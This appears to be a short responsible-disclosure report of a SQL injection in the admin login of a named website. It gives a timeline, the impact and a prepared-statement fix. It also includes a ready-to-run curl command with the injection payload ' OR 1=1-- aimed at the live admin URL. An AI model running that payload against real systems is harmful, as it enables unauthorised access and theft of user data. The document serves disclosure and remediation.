# Wassimos.com SQLi Responsible Disclosure 🚨

**Researcher:** OmarMahmoudi-arch  
**ISITCOM Sousse Cybersecurity Student** | Sousse, Tunisia  
**Date:** January 21, 2026  

## 🎯 Vulnerability Details
| Field | Info |
|-------|------|
| **Target** | `https://wassimos.com/admin` |
| **Type** | SQL Injection (CWE-89) |
| **Severity** | **CRITICAL** (CVSS 9.8) |
| **Component** | WassimOS custom admin panel |
## 🔍 Attack Timeline:
21:02 - Argus → /admin found (200 OK) [1.jpg]
21:10 - Cloudflare WAF bypassed [3.jpg]
21:12 - Login page confirmed [4.jpg]
21:15 - SQLi → PHP/MySQL leaks [6-17.jpg]
21:43 - Disclosure email sent [email.jpg]
## 💻 Exact Reproduction
```bash
curl -k -L -X POST https://wassimos.com/admin \
  -d "email=admin@wassimos.com&password=' OR 1=1--"
Result: Full PHP stack traces + MySQL internals leaked:
✅ /var/www/wassimos/admin/auth.php
✅ Database connection strings
✅ Production display_errors=On
💥 Impact : 
🔴 Extract all users (email/Discord tokens)
🔴 Database schema enumeration
🔴 Potential RCE (stacked queries)
🔴 Complete admin takeover
🛠️ Fix Guide :
// Vulnerable
$query = "SELECT * FROM users WHERE password='$password';"

// Fixed
$stmt = $pdo->prepare("SELECT * FROM users WHERE password=?");
$stmt->execute([$password]);
```